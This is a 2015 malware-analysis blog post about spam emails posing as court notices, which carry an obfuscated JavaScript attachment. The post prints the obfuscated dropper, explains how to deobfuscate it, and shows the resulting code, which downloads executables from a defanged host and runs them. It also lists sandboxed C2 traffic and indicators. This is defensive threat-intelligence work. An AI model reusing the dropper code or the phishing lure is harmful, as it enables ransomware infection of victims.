@@ -1,0 +1,231 @@
+---
+layout: post
+title: "Ransomware from Emails With JavaScript Attachments"
+date: 2015-08-05 19:12:35 -0500
+comments: true
+categories: [Malware Analysis, Malspam, Ransomware, Threat Intel]
+---
+
+Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall 3.0 variant but I did not verify it.
+
+<!--more-->
+
+#### Email Indicators
+    Received: from uplander.websitewelcome.com (uplander.websitewelcome.com [192.185.179.118])
+    Subject: Notice to appear in Court #00000536215
+    From: "State Court" <allan.barnett@ns963.websitewelcome.com>
+    Reply-To: "State Court" <allan.barnett@ns963.websitewelcome.com>
+    Attachment: 00000536215.zip -> 00000536215.doc.js
+---
+#### Message Body
+    Notice to Appear,
+
+    This is to inform you to appear in the Court on the August 11 for your case hearing.
+    Please, do not forget to bring all the documents related to the case.
+    Note: The case may be heard by the judge in your absence if you do not come.
+
+    The copy of Court Notice is attached to this email.
+
+    Yours faithfully,
+    Allan Barnett,
+    Court Secretary.
+
+### Deobfuscating the JavaScript
+Below is the original decompressed file contents. It tries to hide itself as a better known file type (.doc) but any modern operating system would most likely recognize and interpret the JavaScript file. Luckily for us, it is rather easy to deobfuscate something like this. You can use a tool like JSDetox or use a JavaScript interpreter like node.js. The key thing we need to overcome is that JSDetox and node.js most likely won't have access to ActiveX so we have to remove the check otherwise it will not deobfuscate.
+
+```javascript  00000536215.doc.js
+var jlavws='fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p"uWvSocaruiapota.wSshieplulm"m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS';var jdmkdr='mtgreilnxgxse(a"p%cTiEoMfPf%h"f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z"rMbSnXiMmLw2o.gXcMhLfHxTyTfPd"a)p;y z exhoz.zot';var xxjg='ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w"lAyDqOyDjBx.nS';var bpm='ptrrseaawms"l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i';var his=' oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y"tGqEeTn"w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn';var bey='ldh(l)k;b c o o yiqfe p(irfnt b>g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g"ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z';var yjb='iwmcaygqeusr/ufeixvjeh1m.ojzptgh"p,f w"c5z3f2w7k4r7u3a5r0e.terxaev"q,r q1h)l;udelv(b"rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn"y,k d"p2z1e1y9i5f4z8v6z9r.iepxaen"v,q e1v)';var buh='l;q';var a1=jlavws+jdmkdr+xxjg+bpm+his+bey+yjb+buh;   var a2="";   var a3=2;      var a4=10;      var y = new ActiveXObject("Scripting.Dictionary");   y.add ("a", "t");      if (y.Item("a")=="t"){a4=0;}else{a4=10};      var a5=a1.length;   var a=0;   while(a<a5){    a2 +=a1.charAt(a);a +=a3+a4;   };   var rosa=["e","0","v","0","a","0","l","0"];   var tosta=rosa[0+a4]+rosa[2+a4]+rosa[4+a4]+rosa[6+a4];   var a6=tosta;   this[a6](a2);
+```
+Expanding and cleaning up the glob of JavaScript above gives us `00000536215_clean.doc.js`. I added comments to point out the key points to be aware of when running this through JSDetox/node. The first comment is where the script checks for ActiveX which both tools will not have access to out of the box. Looking at the code we can see the default value `a4 = 10` breaks the while loop before it can build the deobfuscated string. If we simply hard code `a4 = 0` before the loop and comment/delete the while loop it will build the string as intended. In the end the two values we care most about are `a2` and `a6`. When the script gets to `this[a6](a2)` it is essentially performing an `eval()` operation on the debofuscated string stored in `a2`.
+
+```javascript 00000536215_clean.doc.js
+var jlavws = 'fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p"uWvSocaruiapota.wSshieplulm"m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS';
+
+var jdmkdr = 'mtgreilnxgxse(a"p%cTiEoMfPf%h"f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z"rMbSnXiMmLw2o.gXcMhLfHxTyTfPd"a)p;y z exhoz.zot';
+
+var xxjg = 'ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w"lAyDqOyDjBx.nS';
+
+var bpm = 'ptrrseaawms"l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i';
+
+var his = ' oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y"tGqEeTn"w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn';
+
+var bey = 'ldh(l)k;b c o o yiqfe p(irfnt b>g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g"ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z';
+
+var yjb = 'iwmcaygqeusr/ufeixvjeh1m.ojzptgh"p,f w"c5z3f2w7k4r7u3a5r0e.terxaev"q,r q1h)l;udelv(b"rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn"y,k d"p2z1e1y9i5f4z8v6z9r.iepxaen"v,q e1v)';
+
+var buh = 'l;q';
+var a1 = jlavws + jdmkdr + xxjg + bpm + his + bey + yjb + buh;
+var a2 = "";
+var a3 = 2;
+var a4 = 0; // Hardcode to 0, originally set to 10
+
+/* 1.
+  Checks for ActiveX otherwise it will not deobfuscate
+  We can comment this out in JSDetox and hard code a4 to 0
+*/
+var y = new ActiveXObject("Scripting.Dictionary");
+y.add("a", "t");
+if(y.Item("a") == "t") {
+    a4 = 0;
+} else {
+    a4 = 10;
+};
+
+/* 2.
+  This function will deobfuscate and build the string to be evaluated below
+*/
+var a5 = a1.length;
+var a = 0;
+while(a < a5) {
+    a2 += a1.charAt(a);
+    a += a3 + a4;
+};
+
+/* 3.
+  Transforms to set a6 = 'eval'
+*/
+var rosa = ["e", "0", "v", "0", "a", "0", "l", "0"];
+var tosta = rosa[0 + a4] + rosa[2 + a4] + rosa[4 + a4] + rosa[6 + a4];
+var a6 = tosta;
+
+/* 4.
+  The eval() function and a2 is the deobfuscated string to run
+*/
+// this[a6](a2);
+```
+Now that we have a readable version of the JavaScript it is pretty easy to tell what it is doing. Basically the script downloads the two files `five1.jpg` and `five2.jpg` which are actually MS-DOS executables. Then using a Windows Script Host Shell it attempts to run each of the downloaded payloads.
+
+```javascript deobfuscated.js
+function dl(fr, fn, rn){
+  var ws = new ActiveXObject("WScript.Shell");
+  var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + fn;
+  var xo = new ActiveXObject("MSXML2.XMLHTTP");
+  xo.onreadystatechange = function (){
+    if (xo.readyState === 4){
+      var xa = new ActiveXObject("ADODB.Stream");
+      xa.open();
+      xa.type = 1;
+      xa.write(xo.ResponseBody);
+      xa.position = 0;
+      xa.saveToFile(fn, 2);
+      xa.close();
+    };
+  };
+  try {
+    xo.open("GET", fr, false);
+    xo.send();
+    if (rn > 0){
+      ws.Run(fn, 0, 0);
+    };
+  }  catch (er){  };
+}
+dl("hxxp://31072015a[.]com/images/five1.jpg", "532747350.exe",1);   // Download payload 1
+dl("hxxp://31072015a[.]com/images/five2.jpg", "211954869.exe", 1);  // Download payload 2
+```
+Here are some of the network indicators and behaviors I observed from sandboxing the payloads. If you have any questions or comments about the analysis feel free to reach out to me.
+
+#### five1.jpg/532747350.exe Analysis
+    # Payload Download: Response
+    * Connected to 31072015a[.]com (195.225.228.156) port 80 (#0)
+    GET /images/five1.jpg HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+    Host: 31072015a[.]com
+    Accept: */*
+
+    HTTP/1.1 200 OK
+    Server: Apache/2.2.15 (CentOS)
+    Last-Modified: Wed, 05 Aug 2015 21:35:01 GMT
+    ETag: "c10000c-40e00-51c972cdc4b23"
+    Accept-Ranges: bytes
+    Content-Length: 265728
+    Connection: close
+
+    # Registry Activity
+    Modifies registry to disable system restore
+    Creates a file in the windows start menu folder
+    Modifies autorun registry key values
+
+    # Network Traffic
+    GET hxxp://ip-addr[.]es:80/
+    Server IP: 188.165.164.184
+
+    POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?w=cg1odjtnay
+    POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?n=t1dfbt93fg
+    POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?h=qovvtc388iq4bm
+    POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?t=4l425ka9qjn
+    Server IP: 112.78.2.209
+
+    POST hxxp://aeusasoftball[.]com:80/wp-content/themes/sports-team-theme/includes/adva...cg1odjtnay
+    Server IP: 184.168.47.225
+
+    GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?b=cg1odjtnay
+    GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?f=t1dfbt93fg
+    GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?p=qovvtc388iq4bm
+    GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?y=4l425ka9qjn
+    POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?b=cg1odjtnay
+    POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?f=t1dfbt93fg
+    POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?p=qovvtc388iq4bm
+    POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?y=4l425ka9qjn
+    Server IP: 94.102.1.207
+
+    POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?x=cg1odjtnay
+    POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?u=t1dfbt93fg
+    POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?p=4l425ka9qjn
+    Server IP: 95.85.4.87
+---
+#### five2.jpg/211954869.exe Analysis
+    # Payload Download: Response
+    * Connected to 31072015a[.]com (107.15.99.91) port 80 (#0)
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+    Host: 31072015a[.]com
+    Accept: */*
+    HTTP/1.1 200 OK
+
+    Server: Apache/2.2.15 (CentOS)
+    Last-Modified: Wed, 05 Aug 2015 21:30:02 GMT
+    ETag: "c100037-3a600-51c971b00f877"
+    Accept-Ranges: bytes
+    Content-Length: 239104
+    Connection: close
+    Content-Type: image/jpeg
+
+    # Network Traffic
+    Post-Infection Requests:
+    POST hxxp://prestigecarstorage.com[.]au:80/wp-includes/Text/Text.php
+    Server IP: 192.186.240.131
+
+    POST hxxp://mcmamina[.]cz:80/media/plg_quickicon_joomlaupdate/plg_quickicon_joomlaupdate.php
+    Server IP: 82.208.47.134
+
+    POST hxxp://buyseoplan[.]com:80/wp-admin/includes/includes.php
+    Server IP: 160.153.34.130
+
+    POST hxxp://letssaidiana[.]com:80/wp-admin/user/user.php
+    Server IP: 50.62.121.1
+
+    POST hxxp://kenyadivas[.]com:80/media/editors/editors.php
+    Server IP: 192.254.185.141
+
+    POST hxxp://keithgerchak[.]com:80/wp-admin/css/css.php
+    Server IP: 50.63.93.1
+
+    POST hxxp://binarycashbackdaily[.]com:80/wp-admin/maint/maint.php
+    Server IP: 198.15.118.164
+
+    POST hxxp://apexsitesolutions[.]com:80/main/wp-admin/mod_html.php
+    Server IP: 184.168.179.1
+
+    POST hxxp://employerservice[.]net:80/wp-includes/theme-compat/theme-compat.php
+    Server IP: 23.229.242.167
+
+    POST hxxp://hmb.com[.]au:80/wp-admin/images/images.php
+    Server IP: 192.186.203.132
+
+    POST hxxp://denver-computer-repairs[.]com:80/wordpress2/wp-includes/fckeditor.php
+    Server IP: 173.201.146.180
+
+    POST hxxp://hatmandoo.co[.]uk:80/cache/mod_menu/mod_menu.php
+    Server IP: 192.254.235.245
+
+    POST hxxp://wizjafotografii[.]pl:80/wp-content/languages/languages.php
+    Server IP: 46.16.186.66
